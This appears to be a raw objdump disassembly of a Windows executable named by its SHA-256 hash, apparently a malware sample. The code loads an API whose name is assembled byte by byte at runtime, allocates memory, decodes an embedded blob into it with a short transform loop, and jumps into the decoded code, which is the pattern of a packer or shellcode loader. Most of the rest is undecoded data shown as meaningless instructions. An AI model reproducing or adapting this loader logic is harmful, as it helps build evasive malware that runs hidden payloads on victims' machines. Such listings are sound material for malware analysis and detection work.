
8aaa4fda3e69ee50f35a90dc06e25e2637905e250001a194e56afa004166f421.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0xac476d7
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	mov    al,0xb5
  411450:	in     eax,dx
  411451:	add    ebx,DWORD PTR [eax-0x2cd4d24e]
  411457:	and    eax,0x37d950d1
  41145c:	jge    0x411442
  41145e:	clc    
  41145f:	leave  
  411460:	enter  0xb0d5,0xf9
  411464:	das    
  411465:	xor    DWORD PTR [ebx+0x5c],ebx
  411468:	lods   al,BYTE PTR ds:[esi]
  411469:	cmp    edi,DWORD PTR [esi]
  41146b:	ja     0x41149e
  41146d:	or     eax,ecx
  41146f:	jo     0x4113f2
  411471:	mov    dh,BYTE PTR [ebp+0x4a73a3ca]
  411477:	pop    ss
  411478:	aam    0x35
  41147a:	pop    esi
  41147b:	scas   eax,DWORD PTR es:[edi]
  41147c:	ja     0x41147c
  41147e:	cli    
  41147f:	pushf  
  411480:	cmp    cl,bh
  411482:	xchg   DWORD PTR [edi],edx
  411484:	pop    esp
  411485:	fwait
  411486:	aaa    
  411487:	test   al,0x76
  411489:	lds    ebx,FWORD PTR [edi+0x1b]
  41148c:	stos   BYTE PTR es:[edi],al
  41148d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148e:	jl     0x41141f
  411490:	xlat   BYTE PTR ds:[ebx]
  411491:	or     eax,0xe94fc6a3
  411496:	mov    DWORD PTR [ecx],0x864bbc19
  41149c:	sbb    edi,DWORD PTR [edi+0x4138455e]
  4114a2:	js     0x41151b
  4114a4:	dec    ebx
  4114a5:	(bad)  
  4114a6:	xor    BYTE PTR [esi-0x7a8053b0],ah
  4114ac:	sbb    BYTE PTR [edi+0x37],dh
  4114af:	popa   
  4114b0:	addr16 add esp,esi
  4114b3:	mov    dh,0x18
  4114b5:	push   es
  4114b6:	and    dl,ah
  4114b8:	mov    ch,0x4f
  4114ba:	cli    
  4114bb:	jbe    0x4114d8
  4114bd:	xor    BYTE PTR [ecx],bl
  4114bf:	icebp  
  4114c0:	aaa    
  4114c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c2:	ins    DWORD PTR es:[edi],dx
  4114c3:	sbb    bl,al
  4114c5:	dec    eax
  4114c6:	in     eax,dx
  4114c7:	mov    eax,0xbd2ce6e1
  4114cc:	add    ch,bh
  4114ce:	inc    ecx
  4114cf:	es aas 
  4114d1:	adc    ebx,DWORD PTR [ecx-0x54]
  4114d4:	aaa    
  4114d5:	sub    bl,bl
  4114d7:	dec    eax
  4114d8:	cdq    
  4114d9:	aad    0x60
  4114db:	jae    0x4114c6
  4114dd:	jmp    0x411521
  4114df:	std    
  4114e0:	push   esi
  4114e1:	and    al,0xba
  4114e3:	lds    esp,FWORD PTR [eax]
  4114e5:	ret    
  4114e6:	mov    bl,0xc0
  4114e8:	lahf   
  4114e9:	inc    ecx
  4114ea:	dec    eax
  4114eb:	jnp    0x4114e8
  4114ed:	mov    dl,0x1e
  4114ef:	jp     0x4114ed
  4114f1:	mov    dh,0x19
  4114f3:	xor    al,0xcb
  4114f5:	dec    ecx
  4114f6:	mov    eax,0xe9469425
  4114fb:	inc    esp
  4114fc:	pop    edi
  4114fd:	cwde   
  4114fe:	sahf   
  4114ff:	test   ch,0xec
  411502:	adc    DWORD PTR [esi],esi
  411504:	xchg   esi,eax
  411505:	jo     0x41151e
  411507:	outs   dx,DWORD PTR ds:[esi]
  411508:	in     al,0xc3
  41150a:	mov    ds:0xc5893d69,eax
  41150f:	and    eax,0xd5fcebdb
  411514:	sub    BYTE PTR [edi+0x66],0xce
  411518:	adc    DWORD PTR [eax+0x29],0xc10a9454
  41151f:	ret    0xce3d
  411522:	mov    ds:0xa343700d,eax
  411527:	xor    esp,esi
  411529:	ret    
  41152a:	inc    ebx
  41152b:	jge    0x41155e
  41152d:	sub    eax,0x68f3dfe3
  411532:	fwait
  411533:	sbb    DWORD PTR [edx+0x1f],0xb6736320
  41153a:	mov    al,0x81
  41153c:	add    DWORD PTR ds:0xc88da4ab,eax
  411542:	enter  0x4834,0x5c
  411546:	ins    BYTE PTR es:[edi],dx
  411547:	int    0xe3
  411549:	call   0x5f88a6b
  41154e:	xchg   ebx,eax
  41154f:	adc    DWORD PTR [eax-0x5c],ecx
  411552:	pushf  
  411553:	or     eax,0xdf30a563
  411558:	(bad)  
  411559:	sub    al,0xb6
  41155b:	jmp    0x411515
  41155d:	add    BYTE PTR [ecx+0x14],0x1
  411561:	adc    ebx,esi
  411563:	out    0x81,eax
  411565:	push   edi
  411566:	jnp    0x4114f0
  411568:	call   DWORD PTR [edi-0x3f]
  41156b:	dec    ecx
  41156c:	shl    cl,1
  41156e:	add    cl,BYTE PTR [ecx-0x23]
  411571:	mov    ds:0x23f393b,eax
  411576:	push   ecx
  411577:	clc    
  411578:	stc    
  411579:	retf   0x2e00
  41157c:	ret    0x3fc8
  41157f:	inc    eax
  411580:	(bad)  
  411581:	repnz pop ebp
  411583:	or     al,0xc7
  411585:	pop    es
  411586:	pop    eax
  411587:	scas   al,BYTE PTR es:[edi]
  411588:	arpl   WORD PTR [eax-0x4d17dd76],sp
  41158e:	or     eax,0xd3e560ff
  411593:	cs push edx
  411595:	test   al,0x5e
  411597:	sbb    ebx,DWORD PTR [eax-0x7f]
  41159a:	push   ss
  41159b:	in     eax,dx
  41159c:	pop    ss
  41159d:	mov    esp,0xc0207a66
  4115a2:	(bad)  
  4115a3:	repz sbb dl,bh
  4115a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a7:	inc    esi
  4115a8:	xchg   esp,ecx
  4115aa:	shr    BYTE PTR [ecx+0x59],cl
  4115ad:	sub    eax,0x45be993e
  4115b2:	shr    DWORD PTR [ecx],cl
  4115b4:	out    0xda,eax
  4115b6:	(bad)  
  4115b8:	in     eax,dx
  4115b9:	fcom   QWORD PTR [edi+0x1e8c1337]
  4115bf:	lods   eax,DWORD PTR ds:[esi]
  4115c0:	push   edi
  4115c1:	or     edi,DWORD PTR [ebp-0x58a7c40a]
  4115c7:	ret    
  4115c8:	jae    0x4115cd
  4115ca:	sub    DWORD PTR [ebp+0xd],0x20e240a3
  4115d1:	push   ss
  4115d2:	push   esi
  4115d3:	dec    edx
  4115d4:	mov    al,ds:0xc4779579
  4115d9:	xchg   edx,eax
  4115da:	bound  ebx,QWORD PTR [eax]
  4115dc:	(bad)
  4115e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e1:	jmp    0x411602
  4115e3:	mov    ds:0xc9015c1a,eax
  4115e8:	sub    eax,0xc80f57fc
  4115ed:	mov    ds:0x26c14ff3,eax
  4115f2:	std    
  4115f3:	jmp    0x411600
  4115f5:	aaa    
  4115f6:	xchg   ebx,eax
  4115f7:	jnp    0x4115ab
  4115f9:	cmc    
  4115fa:	jb     0x41167a
  4115fc:	test   BYTE PTR fs:[esi+edi*8+0x1be214a6],bl
  411604:	xlat   BYTE PTR ds:[ebx]
  411605:	jmp    0xce59d1c2
  41160a:	cmp    ebp,DWORD PTR [edi+0x328c8d3e]
  411610:	into   
  411611:	mov    dh,0x95
  411613:	(bad)  
  411614:	jmp    0xe385:0x7aadc87d
  41161b:	lods   al,BYTE PTR ds:[esi]
  41161c:	fucomip st,st(6)
  41161e:	and    ebp,0x75
  411621:	or     eax,0xbf42c63
  411626:	jp     0x41163c
  411628:	aaa    
  411629:	enter  0x2e20,0xc6
  41162d:	adc    DWORD PTR [ebp-0x43700db],edi
  411633:	into   
  411634:	out    0x34,eax
  411636:	and    DWORD PTR [edi-0x59],eax
  411639:	test   BYTE PTR [ebx+0x3703a1db],ch
  41163f:	and    eax,0x890eff69
  411644:	call   0x8b27256d
  411649:	fs push ss
  41164b:	and    dl,cl
  41164d:	fist   DWORD PTR fs:[eax+0x75f06062]
  411654:	push   ebp
  411655:	sar    BYTE PTR ds:0x6d51ada4,0xb6
  41165c:	mov    bl,0xd5
  41165e:	or     DWORD PTR [ebx],edi
  411660:	test   DWORD PTR [eax+0x6e680f3a],edi
  411666:	sub    al,0x6b
  411668:	in     eax,0x2c
  41166a:	call   0x2079:0xfb6b4816
  411671:	retf   
  411672:	sub    ebp,DWORD PTR [ebx]
  411674:	cmp    eax,DWORD PTR [ebx-0x31]
  411677:	pop    esi
  411678:	es mov esi,0xb891b8bb
  41167e:	ins    DWORD PTR es:[edi],dx
  41167f:	jbe    0x411627
  411681:	fbld   TBYTE PTR [edi-0x5d]
  411684:	push   edi
  411685:	jle    0x411658
  411687:	dec    edi
  411688:	jae    0x4116e6
  41168a:	out    dx,al
  41168b:	or     eax,0xd57caf3e
  411690:	add    al,0xeb
  411692:	adc    edi,DWORD PTR [esp+edi*4-0x25]
  411696:	push   0x35
  411698:	dec    esp
  411699:	leave  
  41169a:	addr16 mov bh,0x25
  41169d:	stos   DWORD PTR es:[edi],eax
  41169e:	jle    0x4116eb
  4116a0:	pushf  
  4116a1:	test   eax,0x6c21450
  4116a6:	or     dl,BYTE PTR ds:0xbbdec3ca
  4116ac:	jbe    0x41163a
  4116ae:	psubw  mm2,QWORD PTR [ebx+eax*1]
  4116b2:	jne    0x411666
  4116b4:	shr    DWORD PTR [edi-0x4525d0e4],0x22
  4116bb:	sbb    ebp,0xffffffc9
  4116be:	add    al,0x63
  4116c0:	jo     0x4116d8
  4116c2:	jae    0x4116fd
  4116c4:	loop   0x41169d
  4116c6:	mov    edi,DWORD PTR [eax]
  4116c8:	jno    0x411699
  4116ca:	mov    ds:0xa5a2ecbf,al
  4116cf:	jmp    0xe9e70d38
  4116d4:	popf   
  4116d5:	push   edx
  4116d6:	stc    
  4116d7:	sahf   
  4116d8:	fcmovnbe st,st(5)
  4116da:	mov    ch,0xda
  4116dc:	sbb    ebx,ebp
  4116de:	push   ebx
  4116df:	push   esi
  4116e0:	or     ebx,esi
  4116e2:	inc    ebx
  4116e3:	fs push edi
  4116e5:	in     al,0xcb
  4116e7:	arpl   di,cx
  4116e9:	shl    DWORD PTR [ebp-0x3f],0x6b
  4116ed:	imul   ebx,DWORD PTR [eax+edi*8+0x46d420ae],0x5260d1ab
  4116f8:	sbb    dl,BYTE PTR [edx+edx*8+0x7675bb19]
  4116ff:	aaa    
  411700:	dec    esi
  411701:	(bad)  
  411702:	ins    DWORD PTR es:[edi],dx
  411703:	or     bh,BYTE PTR [edi-0x7b0652dd]
  411709:	fcmovnu st,st(6)
  41170b:	pop    ebx
  41170c:	cdq    
  41170d:	test   DWORD PTR [edx],0x99039b72
  411713:	jo     0x41178e
  411715:	(bad)  
  411716:	dec    edi
  411717:	sub    dl,BYTE PTR [eax+0x5115b325]
  41171d:	pop    edi
  41171e:	jl     0x411723
  411720:	xor    dh,cl
  411722:	push   es
  411723:	mov    ebp,0x1954d971
  411728:	mov    ebx,DWORD PTR [eax]
  41172a:	cwde   
  41172b:	add    al,0x33
  41172d:	jnp    0x411706
  41172f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411730:	xchg   edx,eax
  411731:	mov    bl,0x9e
  411733:	jno    0x4116fe
  411735:	dec    ebp
  411736:	retf   
  411737:	push   es
  411738:	pusha  
  411739:	into   
  41173a:	sub    esp,edx
  41173c:	pop    edx
  41173d:	clc    
  41173e:	push   ecx
  41173f:	lods   eax,DWORD PTR ds:[esi]
  411740:	or     edx,edx
  411742:	or     BYTE PTR [bx+si+0xb94],dh
  411747:	es dec ebp
  411749:	mov    ds:0xfef69fb5,al
  41174e:	mov    eax,ds:0x95dda603
  411753:	jns    0x411798
  411755:	int    0xbf
  411757:	mov    bl,0xf0
  411759:	in     eax,0x44
  41175b:	retf   
  41175c:	dec    edx
  41175d:	out    dx,eax
  41175e:	ror    DWORD PTR ds:0x20506b8a,1
  411764:	mov    ah,0x1c
  411766:	pop    ecx
  411767:	mov    al,ds:0xf444a4eb
  41176c:	add    DWORD PTR ds:0xdd2b26b8,esp
  411772:	stos   BYTE PTR es:[edi],al
  411773:	ins    BYTE PTR es:[edi],dx
  411774:	or     BYTE PTR [ebx],0x78
  411777:	sbb    BYTE PTR [eax+0x7b599448],dh
  41177d:	out    dx,eax
  41177e:	pop    esi
  41177f:	imul   esp,DWORD PTR [ebx],0x91e6be2
  411785:	add    BYTE PTR [ebp-0x11],bh
  411788:	xor    ebp,DWORD PTR [ecx+0x35bccf9d]
  41178e:	bound  ecx,QWORD PTR [edi+0x5c]
  411791:	out    dx,eax
  411792:	fisub  WORD PTR [esi+edx*2-0x38]
  411796:	fcmovu st,st(2)
  411798:	test   al,0x4e
  41179a:	call   0xbb80:0x2dfb59ba
  4117a1:	adc    DWORD PTR [ecx],esi
  4117a3:	fld    QWORD PTR ds:0xaee5b2a3
  4117a9:	adc    cl,BYTE PTR [esi]
  4117ab:	(bad)  
  4117ac:	jae    0x411791
  4117ae:	test   eax,0x746803
  4117b3:	test   al,0x8e
  4117b5:	nop
  4117b6:	ins    DWORD PTR es:[edi],dx
  4117b7:	jno    0x411799
  4117b9:	jg     0x41177e
  4117bb:	(bad)  
  4117bc:	push   cs
  4117bd:	push   ebp
  4117be:	xchg   BYTE PTR [edx+0x46],ah
  4117c1:	push   eax
  4117c2:	stc    
  4117c3:	aaa    
  4117c4:	mov    edx,0x2434b2ff
  4117c9:	pop    ecx
  4117ca:	mov    dl,0xd5
  4117cc:	mov    bl,0x2d
  4117ce:	jmp    0x4117ca
  4117d0:	outs   dx,BYTE PTR ds:[esi]
  4117d1:	lods   eax,DWORD PTR ds:[esi]
  4117d2:	sub    al,0x44
  4117d4:	inc    eax
  4117d5:	mov    edi,0x8fde79a
  4117da:	icebp  
  4117db:	cs call 0x22d29290
  4117e1:	push   ebx
  4117e2:	ins    DWORD PTR es:[edi],dx
  4117e3:	adc    al,0xa2
  4117e5:	jns    0x411822
  4117e7:	adc    BYTE PTR [esp+ecx*8],al
  4117ea:	pop    esi
  4117eb:	je     0x411857
  4117ed:	call   0x7bb77aaf
  4117f2:	test   BYTE PTR [esi-0x4ff947d8],ah
  4117f8:	loopne 0x411832
  4117fa:	call   0xf0e5:0x71165854
  411801:	or     DWORD PTR [ebx-0x753e8bb1],eax
  411807:	push   edx
  411808:	retf   0x23e4
  41180b:	xchg   BYTE PTR [edx-0x3fd299a0],bl
  411811:	or     dl,BYTE PTR [esi]
  411813:	adc    eax,0xe1ddf5a8
  411818:	mov    bl,0x66
  41181a:	jno    0x411870
  41181c:	add    edx,edx
  41181e:	mov    dl,0x5a
  411820:	std    
  411821:	rcr    DWORD PTR [ecx+eiz*4-0x1b0ddfad],0x99
  411829:	jmp    0xc78aee2
  41182e:	and    al,0x35
  411830:	pop    esi
  411831:	stos   BYTE PTR es:[edi],al
  411832:	dec    edi
  411833:	adc    eax,0x80b4200b
  411838:	les    ecx,FWORD PTR [edi+0x3b]
  41183b:	and    eax,DWORD PTR [edi+0x35]
  41183e:	sahf   
  41183f:	and    BYTE PTR [ebx],cl
  411841:	dec    esi
  411842:	mov    al,ds:0x29ac6f3b
  411847:	rcl    cl,cl
  411849:	in     al,dx
  41184a:	int3   
  41184b:	enter  0x7114,0x1
  41184f:	out    0xa4,al
  411851:	call   0x9b2e7568
  411856:	sbb    edx,DWORD PTR [ebx-0x29]
  411859:	mov    al,0x75
  41185b:	shl    edx,1
  41185d:	add    DWORD PTR ds:0xd1c0a02c,edi
  411863:	pop    es
  411864:	jmp    0xb9e51236
  411869:	aad    0xc1
  41186b:	mov    ds:0xeb27126f,al
  411870:	mov    ebp,0x4966f586
  411875:	mov    bl,0xa6
  411877:	jp     0x411830
  411879:	cmp    bh,ah
  41187b:	mov    ebp,0xb4bcabea
  411880:	dec    ebx
  411881:	push   ebp
  411882:	sub    al,0x55
  411884:	xor    DWORD PTR [eax+0x50df0054],esp
  41188a:	mov    al,0x91
  41188c:	xchg   BYTE PTR [ebp+0x52896315],bh
  411892:	(bad)  
  411893:	cmp    al,cl
  411895:	(bad)  
  411897:	or     esi,DWORD PTR [esi+0x48]
  41189a:	or     DWORD PTR [edi+0x2b],edi
  41189d:	add    ebp,DWORD PTR [ecx+0x53]
  4118a0:	mov    BYTE PTR [eax+0x59267c4b],bh
  4118a6:	ja     0x41186a
  4118a8:	pop    es
  4118a9:	pop    es
  4118aa:	mov    edi,0x39bad2bd
  4118af:	add    al,0x10
  4118b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b2:	xchg   esi,eax
  4118b3:	push   0x4
  4118b5:	popf   
  4118b6:	jmp    0x4118ff
  4118b8:	popfw  
  4118ba:	add    cl,BYTE PTR [eax+0x56]
  4118bd:	call   0xcc21c343
  4118c2:	das    
  4118c3:	in     eax,0x46
